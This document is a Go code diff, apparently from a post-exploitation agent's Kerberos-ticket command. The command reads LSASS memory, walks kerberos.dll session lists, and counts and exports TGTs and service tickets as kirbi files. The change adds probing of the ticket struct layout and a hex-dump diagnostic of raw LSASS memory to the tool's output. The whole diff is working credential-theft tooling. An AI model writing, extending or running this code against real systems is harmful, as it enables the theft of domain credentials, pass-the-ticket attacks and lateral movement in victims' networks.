@@ -159,6 +159,38 @@ func executeKerbTicketsInner() structs.CommandResult {
 		}
 	}
 
+	// Probe the ticket struct layout using the first ticket found.
+	var ticketProbeMsg string
+	var ticketDiagOutput string
+	ticketProbed := false
+	for _, sess := range sessions {
+		for _, tl := range []struct {
+			off int
+			idx int
+		}{{sessLayout.Tickets1Off, 1}, {sessLayout.Tickets2Off, 2}, {sessLayout.Tickets3Off, 3}} {
+			if tl.off+16 > len(sess.Raw) {
+				continue
+			}
+			listHeadAddr := sess.Address + uintptr(tl.off)
+			head2, headErr2 := readListEntry(reader, listHeadAddr)
+			if headErr2 != nil || head2.Flink == 0 || head2.Flink == listHeadAddr {
+				continue
+			}
+			// Read an extended buffer from the first ticket for probing
+			probeBuf, pErr := reader.Read(head2.Flink, 0x200)
+			if pErr != nil || len(probeBuf) < 0x100 {
+				continue
+			}
+			tickLayout, ticketProbeMsg = probeKerbTicketLayout(reader, head2.Flink, tickLayout)
+			ticketDiagOutput = ticketDiagHexDump(probeBuf, head2.Flink, tickLayout)
+			ticketProbed = true
+			break
+		}
+		if ticketProbed {
+			break
+		}
+	}
+
 	var totalTickets, tgts, serviceTickets, kirbiExported int
 	sessionReports := make([]kerbSessionReport, 0, len(sessions))
 	var outputLines []string
@@ -263,12 +295,16 @@ func executeKerbTicketsInner() structs.CommandResult {
 	header.WriteString(fmt.Sprintf("LSASS PID: %d | kerberos.dll: %s (size %d)\n",
 		pid, summary.KerbDllBase, kerbMod.Size))
 	header.WriteString(fmt.Sprintf("Signature: %s | Table: %s\n", sigVariant, summary.TableAddr))
-	header.WriteString(fmt.Sprintf("Sessions: %d | Tickets: %d (TGTs: %d, Service: %d) | Kirbi: %d\n\n",
+	header.WriteString(fmt.Sprintf("Sessions: %d | Tickets: %d (TGTs: %d, Service: %d) | Kirbi: %d\n",
 		len(sessions), totalTickets, tgts, serviceTickets, kirbiExported))
+	if ticketProbeMsg != "" {
+		header.WriteString(fmt.Sprintf("Ticket probe: %s\n", ticketProbeMsg))
+	}
+	header.WriteString("\n")
 
 	for _, line := range outputLines {
 		header.WriteString(line + "\n")
 	}
 
-	return successResult(header.String() + diagOutput + "\n" + string(jsonBytes))
+	return successResult(header.String() + diagOutput + ticketDiagOutput + "\n" + string(jsonBytes))
 }
